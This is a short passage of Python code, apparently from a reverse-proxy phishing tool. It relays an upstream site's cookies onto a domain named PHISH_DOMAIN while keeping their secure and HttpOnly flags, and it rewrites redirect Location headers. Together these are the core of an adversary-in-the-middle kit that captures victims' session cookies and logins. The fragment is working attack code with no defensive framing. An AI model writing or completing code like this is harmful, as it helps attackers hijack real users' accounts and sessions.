        response.set_cookie(c.name, c.value, domain=PHISH_DOMAIN, path=c.path or "/", secure=c.secure, httponly=c.has_nonstandard_attr("HttpOnly"))
    if resp.is_redirect:
        loc = rewrite_url(resp.headers.get("Location"))
        response.headers["Location"] = loc
    return response


